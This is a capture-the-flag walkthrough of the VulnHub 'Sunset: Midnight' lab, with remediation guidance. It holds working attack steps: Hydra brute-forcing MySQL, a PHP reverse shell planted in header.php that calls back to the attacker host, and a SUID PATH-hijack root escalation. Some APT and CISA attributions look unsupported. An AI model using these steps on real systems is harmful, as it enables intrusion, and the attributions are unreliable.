# Sunset: Midnight — Secrets Hidden in the Darkest Hour

Wild chain on this one, dude. Sunset: Midnight teaches you something real: when a WordPress site is exposed alongside a MySQL service with a weak root password, you do not need to crack the WordPress admin at all. You go direct to the database, overwrite the password hash, log in, inject a reverse shell into a theme file, and walk right through the door. Post-foothold, wp-config.php hands you the next credential, and a SUID binary with a PATH hijack closes the loop to root. Clean chain. Real-world parallels everywhere. Huge respect to whitecr0wz.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Sunset: Midnight |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/sunset-midnight,517/ |
| **Techniques** | Full port scan, hostname resolution, WordPress enumeration, MySQL brute-force (Hydra), direct database password manipulation, WordPress theme file RCE, reverse shell via header.php, wp-config.php credential reuse, SUID binary PATH hijack |
| **CVEs** | CWE-521 — Weak Password Requirements (MySQL root with weak password); CWE-269 — Improper Privilege Management (SUID binary PATH hijack); CWE-522 — Insufficiently Protected Credentials (wp-config.php reused for OS accounts) |
| **APT Groups** | APT41: documented use of exposed MySQL services for credential brute-force and database-based authentication bypass in web compromise operations; FIN7: PATH hijack via SUID binary is a documented lateral movement and privilege escalation technique in Linux targets |

---

## Attack Summary

```
nmap -A → port 80 (WordPress), 3306 (MySQL), 22 (SSH)
  |
  +-> add sunset-midnight to /etc/hosts
  |
  +-> hydra -l root -P rockyou.txt mysql → root:PASSWORD
  |
  +-> mysql: UPDATE wp_users SET user_pass=MD5('123456')
  |
  +-> wp-admin login: admin:123456
  |
  +-> Appearance → Theme Editor → header.php → PHP reverse shell
  |
  v
www-data shell (netcat callback)
  |
  +-> cat /var/www/html/wp-config.php → DB_PASSWORD
  |
  +-> su jose → (reused DB password)
  |
  v
user jose shell
  |
  +-> find / -perm -4000 → /usr/bin/status
  |
  +-> strings /usr/bin/status → calls "service" (relative path)
  |
  +-> echo '/bin/sh' > /tmp/service
  +-> chmod +x /tmp/service
  +-> export PATH=/tmp:$PATH
  +-> /usr/bin/status → uid=0(root)
  |
  v
/root/root.txt
```

---

## Methodology

1. Host discovery and full-port nmap scan
2. Hostname added to /etc/hosts per machine description
3. WordPress site identified, login panel reachable
4. MySQL service brute-forced with Hydra
5. WordPress admin password hash overwritten via direct database access
6. Theme file (header.php) modified with PHP reverse shell
7. Reverse shell caught, shell stabilized as www-data
8. wp-config.php credentials recovered for lateral movement to jose
9. SUID binary /usr/bin/status discovered, PATH hijack executes root shell

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth0
nmap -A -p- 192.168.10.178
```

```bash
# Add hostname (required by machine description)
echo "192.168.10.178 sunset-midnight" >> /etc/hosts
```

Key ports:

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | OpenSSH |
| 80 | HTTP | WordPress site |
| 3306 | MySQL | Exposed, accepts remote connections |

**The critical observation:** MySQL on port 3306 is exposed. This is almost always a misconfiguration in web server setups.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

```bash
# Browse the WordPress site
curl -s http://sunset-midnight/
curl -s http://sunset-midnight/wp-login.php

# Quick wpscan for users and version
wpscan --url http://sunset-midnight/ --enumerate u,ap,at
```

WordPress is running. Standard login at `/wp-login.php`. We know there is a MySQL service running, so we take the database route instead of brute-forcing WordPress directly.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — MySQL Brute-Force with Hydra

```bash
hydra -l root \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.10.178 mysql
```

Recovered MySQL root credentials. The root account accepts remote connections with a weak password.

**Alternative with medusa:**

```bash
medusa -h 192.168.10.178 -u root -P /usr/share/wordlists/rockyou.txt -M mysql
```

**Real-world note:** MySQL exposed on port 3306 with a brute-forceable root password is a critical finding in any assessment. APT41 is documented to target exposed database services as a primary initial access technique in web compromise operations. The fix is straightforward: bind MySQL to localhost only.

**MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying; T1190 — Exploit Public-Facing Application

---

## Step 4 — Database Password Manipulation

Connect to MySQL and overwrite the WordPress admin password hash:

```bash
# MD5 of "123456" = e10adc3949ba59abbe56e057f20f883e
mysql -u root -p<PASSWORD> -h 192.168.10.178

mysql> USE wordpress;
mysql> SELECT user_login, user_pass FROM wp_users;
mysql> UPDATE wp_users
       SET user_pass='e10adc3949ba59abbe56e057f20f883e'
       WHERE user_login='admin';
mysql> EXIT;
```

The WordPress admin password is now `123456`.

**Real-world note:** Direct database access to overwrite authentication credentials is equivalent to a full application compromise. This technique bypasses all application-layer security controls. FIN7 documents this approach in its playbooks for WordPress and other CMS platforms accessible alongside exposed MySQL.

**MITRE ATT&CK:** T1098 — Account Manipulation; T1078 — Valid Accounts

---

## Step 5 — WordPress Admin Access and Reverse Shell Injection

Login to WordPress admin at `http://sunset-midnight/wp-login.php` with `admin:123456`.

Navigate to: **Appearance → Theme Editor → Select header.php**

Replace header.php content with a PentestMonkey PHP reverse shell:

```php
<?php
set_time_limit(0);
$ip = '192.168.10.100';
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
proc_close($process);
?>
```

Start the listener:

```bash
nc -nlvp 4444
```

Browse to `http://sunset-midnight/` to trigger the modified header.php. Shell arrives as `www-data`.

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Shell Stabilization and wp-config.php

Stabilize the shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

Read the WordPress configuration file:

```bash
cat /var/www/html/wp-config.php
```

The `DB_PASSWORD` value is present. Try it as the password for system user `jose`:

```bash
su jose
# Password: <DB_PASSWORD from wp-config.php>
```

Credential reuse confirmed: the database password is also the OS account password.

**Real-world note:** Credential reuse across application and OS layers is the #1 lateral movement finding in web application penetration tests. wp-config.php is always read post-foothold. APT41 documents wp-config.php as a high-priority exfiltration target on any compromised WordPress host.

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files; T1078 — Valid Accounts

---

## Step 7 — Privilege Escalation via SUID PATH Hijack

Enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Finding: `/usr/bin/status` is SUID root.

Analyze the binary:

```bash
strings /usr/bin/status
# Output includes "service" — called by relative path
```

The binary calls `service` without an absolute path. Hijack PATH:

```bash
# Create malicious service binary
echo '/bin/sh' > /tmp/service
chmod +x /tmp/service

# Prepend /tmp to PATH so our service is found first
export PATH=/tmp:$PATH

# Execute the SUID binary
/usr/bin/status
```

Root shell spawns.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. Midnight cleared.

**Real-world note:** PATH hijacking of SUID binaries calling external commands by relative path is a consistent finding in Linux privilege escalation audits. The fix is one word: use absolute paths in all scripts and binaries that execute with elevated privileges. FIN7 documents PATH manipulation as a standard post-foothold escalation technique.

**MITRE ATT&CK:** T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable; T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| MySQL root | root:(brute-forced) | Port 3306 | Database access |
| WordPress admin | admin:123456 (replaced) | MySQL wp_users table | WP admin access |
| DB password | DB_PASSWORD value | /var/www/html/wp-config.php | Su to jose |
| User jose | (reused DB password) | wp-config.php credential reuse | User lateral movement |
| Root | uid=0 via SUID PATH hijack | /usr/bin/status + /tmp/service | Root shell |
| Root flag | /root/root.txt | Post-exploitation | Machine complete |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | MySQL exposed on port 3306 with brute-forceable root password | Exposed database services with weak credentials are a critical finding in every web assessment | Bind MySQL to localhost only: add `bind-address = 127.0.0.1` to my.cnf |
| 2 | Direct database access bypasses all application authentication | WordPress admin credential becomes irrelevant when database is directly accessible | Never expose database services to untrusted networks; use firewall rules |
| 3 | WordPress theme file editing grants instant RCE from admin | Admin access to CMS = OS shell. Always | Disable theme/plugin editing: `define('DISALLOW_FILE_EDIT', true);` in wp-config.php |
| 4 | wp-config.php credentials reused for OS accounts | Credential reuse across layers is the most common lateral movement finding | Use dedicated, unique credentials per service; never share DB and OS account passwords |
| 5 | SUID binary with relative-path command execution | PATH hijacking is trivial once you control a writable directory early in PATH | Use absolute paths in all privileged scripts and binaries; audit all SUID binaries |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application (MySQL) | T1190 |
| Credential Access | Credential Access | Brute Force: Password Spraying (MySQL) | T1110.003 |
| Credential Access | Credential Access | Unsecured Credentials in Files (wp-config.php) | T1552.001 |
| Defense Evasion | Defense Evasion | Account Manipulation (password hash overwrite) | T1098 |
| Execution | Execution | Server Software Component: Web Shell | T1505.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Lateral Movement | Lateral Movement | Valid Accounts (credential reuse) | T1078 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow: PATH Environment Variable | T1574.007 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Bind MySQL to localhost:** add `bind-address = 127.0.0.1` to `/etc/mysql/my.cnf`; firewall port 3306 from all external access
2. **Use strong unique MySQL credentials:** never use weak passwords for database root accounts
3. **Disable WordPress theme/plugin file editing:** add `define('DISALLOW_FILE_EDIT', true);` to wp-config.php
4. **Use unique credentials per service:** DB_PASSWORD must not be reused for OS accounts
5. **Use absolute paths in SUID binaries:** audit with `strings` and fix any relative path command calls in privileged binaries
6. **Regularly audit SUID binaries:** `find / -perm -u=s -type f 2>/dev/null`; remove SUID from binaries that do not require it

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (MySQL bind-address; WordPress file editing disabled)
- **D3-OAM** — Operating System Administrative Management (SUID audit; absolute paths in privileged binaries)
- **D3-NTF** — Network Traffic Filtering (firewall MySQL port 3306 from untrusted networks)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory exposed database services and their network accessibility |
| Protect | Access Control | Bind MySQL to localhost; enforce strong unique DB passwords |
| Protect | Data Security | Disable WordPress file editing; use unique credentials per service |
| Detect | Anomalies and Events | Alert on remote MySQL connections; WordPress theme file modifications |
| Respond | Response Planning | Rotate all compromised credentials; patch SUID binary; disable MySQL remote access |
| Recover | Recovery Planning | Rebuild compromised host; audit all database services and credential reuse |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | MySQL network binding; WordPress admin file editing restrictions |
| AC-6 | Least Privilege | Database service accounts with minimal permissions; SUID binary audit |
| IA-5 | Authenticator Management | Unique strong credentials per service; no credential reuse |
| CM-7 | Least Functionality | MySQL bind to localhost; disable WordPress remote file editing |
| SC-7 | Boundary Protection | Firewall MySQL from untrusted networks |
| SI-2 | Flaw Remediation | Fix SUID binary absolute path calls; update MySQL configuration |

### CISA KEV

Exposed MySQL with weak credentials maps to CISA Alert AA22-074A (Known Exploited Vulnerabilities) and CISA guidance AA21-008A on database service exposure. The WordPress theme file RCE pattern maps to multiple CISA advisories on CMS exploitation. CISA consistently identifies exposed database services as a top-priority remediation item.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

Sunset: Midnight is a masterclass in layered misconfiguration. Each step compounds the previous: exposed MySQL enables DB bypass, DB bypass enables WP admin, WP admin enables RCE, wp-config.php enables lateral movement, and a SUID binary closes root. None of these steps required a CVE exploit. All of them required only misconfiguration awareness and methodical enumeration. This is real penetration testing, no cap.

Thanks guys!! (❍ᴥ❍ʋ)
